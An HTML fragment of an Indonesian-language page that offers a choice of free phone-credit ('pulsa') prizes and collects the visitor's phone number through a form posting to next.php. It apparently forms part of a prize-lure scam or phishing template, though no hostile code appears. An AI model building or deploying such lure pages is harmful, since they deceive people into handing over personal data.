...
<script language="javascript" type="text/javascript">
     var teks="Pilih Hadiah Yang Anda Inginkan"
     var speed=20
...
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">
       ...
       <form action="next.php" id="login-form" method="post">
<div style="width:100%" class="form-group">
<h4 >
  Pilih Hadiah Pulsa Yang Anda Inginkan
  </h4><br/>
...
<div style="width:100%" class="form-group">
<select class="form-control" id="gems">
<option> Pilih Jumlah Pulsa </option>
...
<div style="width:100%" class="form-group">
  <input class="form-control" name="number"  placeholder="Nomor" type="number" required>
</div>
 <input type="submit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" value="MULAI"> </form>
</div>